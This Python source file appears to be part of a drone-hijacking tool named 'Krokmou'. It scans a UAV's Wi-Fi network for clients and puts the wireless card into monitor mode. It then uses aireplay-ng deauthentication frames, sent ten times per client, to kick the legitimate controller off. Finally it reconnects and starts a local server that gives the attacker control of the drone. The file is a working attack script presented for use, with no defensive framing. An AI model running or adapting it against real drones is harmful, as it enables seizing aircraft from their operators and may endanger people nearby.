import os, time, sys, csv, re, subprocess
from scan_clients import *
from detect_uav import *

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'


def start_airmon(iface):
    #switch wifi to monitor mode to detect the wifi's drone
    os.system("sudo airmon-ng check kill >>/dev/null 2>>/dev/null")
    cmd = "sudo airmon-ng start {0} >>/dev/null 2>>/dev/null".format(iface)
    os.system(cmd)

def stop_airmon(iface_mon):
    #switch off monitor mode and switch on managed mode
    cmd = "sudo airmon-ng stop {0} >>/dev/null 2>>/dev/null".format(iface_mon)
    os.system(cmd)
    # os.system("sudo service NetworkManager start")

#find info about the UAV AP
def scan_wifi(iface_mon, drone):
    #file of UAV's info
    drone_file = "drone_list"
    try:
        cmd = "sudo airodump-ng --bssid {1} --output-format csv -w {0} {2} >>/dev/null 2>>/dev/null".format(drone_file,drone.bssid, iface_mon)
        # os.system("gnome-terminal -- {0}".format(cmd))
        os.system(cmd+" &")
        os.system("sleep 5")
        os.system("killall airodump-ng")
    except Exception as e:
        print("Can't run airodump-ng")

#return the channel of the wifi Connection
def find_channel(mac_drone):
    with open("drone_list-01.csv", newline="") as file:
        reader = csv.reader(file)
        for row in reader:
            n = len(row)
            if n == 15:
                if re.search(mac_drone,row[0]):
                    channel = row[3]
    cmd = "sudo rm drone_list-0*"
    os.system(cmd)
    return channel

def eject_client(client, mac_drone, drone_essid, iface_mon):
    channel = find_channel(mac_drone)
    os.system("sudo iwconfig {0} channel {1}".format(iface_mon, channel))
    cmd = "sudo aireplay-ng -0 1 -e {3} -a {0} -c {1} {2} >>/dev/null 2>>/dev/null".format(mac_drone, client.mac, iface_mon, drone_essid)
    for i in range(10):
        os.system(cmd)

def demote():
    os.seteuid(1000)

def launch_server():
    cmd = "cd drone-browser && node server.js >>/dev/null 2>>/dev/null &"
    cmd2 = "firefox localhost:3001"
    #os.system(cmd)
    server = subprocess.Popen(cmd, shell=True)
    print("\n{}The UAV is under your control !".format(GREEN))
    print("\n{}INFO{}: Please connect to {}http://localhost:3001{} with your browser".format(YELLOW, GREEN, WHITE, GREEN))
    #os.system(cmd2)
    #firefox = subprocess.Popen('firefox http://localhost:3001 >>/dev/null 2>>/dev/null &', shell=True, preexec_fn=demote())
    return server


def exit():
    print("\n{}Please enter {}Stop (S){} when you're done playing with Krokmou to stop running jobs\n".format(GREEN,RED,GREEN))
    print('\n\t{}S{} - Stop\n'.format(RED,GREEN))


def take_control_main(drone, iface):
    network = '192.168.1.2-10'
    client_list = scanNetwork(network)
    if client_list == []:
        print("{}You are the only one connected to the UAV".format(GREEN))
        serv = launch_server()
    else:
        mac_drone = drone.bssid
        drone_essid = drone.essid
        iface_mon = iface+"mon"
        start_airmon(iface)
        for client in client_list:
            try :
                print("{}Trying to eject {}\n{}".format(GREEN, client.mac, WHITE))
                scan_wifi(iface_mon,drone)
                eject_client(client, mac_drone, drone_essid, iface_mon)
            except:
                print("{}ERROR{}:No client connected{}".format(RED,GREEN, WHITE))
        stop_airmon(iface_mon)
        connect_to_uav(drone, iface)  #re-connection to the UAV
        serv = launch_server()

    while True:
        exit()
        header = '{}Krokmou > {}'.format(GREEN,WHITE)
        choice = input(header)

        if choice.upper() == 'S' or choice.upper() == 'STOP':
            #os.system("sudo killall node") #clean the nodejs server. Be carrefull if other node js are running
            serv.terminate()
            os.system("clear")
            #firefox.terminate()
            #firefox to kill with child PID from subprocess
            break
        else:
            print('\n{}Grrrr{}: Krokmou doesn\'t understand.\n'.format(RED,GREEN))
